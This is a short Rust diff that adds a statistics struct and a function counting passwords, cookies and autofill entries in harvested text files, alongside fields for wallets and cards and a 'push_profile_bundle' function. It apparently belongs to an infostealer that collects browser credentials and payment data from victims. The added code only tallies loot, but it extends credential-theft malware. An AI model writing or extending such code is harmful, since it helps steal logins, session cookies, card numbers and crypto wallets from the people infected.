@@ -39,3 +39,35 @@ pub fn push_profile_bundle(
 pub fn sort_entries(files: &mut [(String, String)]) {
     files.sort_by(|a, b| a.0.cmp(&b.0));
 }
+
+#[derive(Debug, Default, Clone, Copy)]
+pub struct ExtractStats {
+    pub autofills: usize,
+    pub cookies: usize,
+    pub passwords: usize,
+    pub wallets: usize,
+    pub cards: usize,
+}
+
+pub fn count_from_files(files: &[(String, String)]) -> ExtractStats {
+    let mut stats = ExtractStats::default();
+
+    for (path, content) in files {
+        let lower = path.to_lowercase();
+        if lower.ends_with("/passwords.txt") {
+            stats.passwords += content.matches("URL:").count();
+        } else if lower.ends_with("/cookies.txt") {
+            stats.cookies += content
+                .lines()
+                .filter(|line| {
+                    let t = line.trim();
+                    !t.is_empty() && !t.starts_with('#')
+                })
+                .count();
+        } else if lower.ends_with("/autofill.txt") {
+            stats.autofills += content.matches("Name:").count() + content.matches("Field:").count();
+        }
+    }
+
+    stats
+}
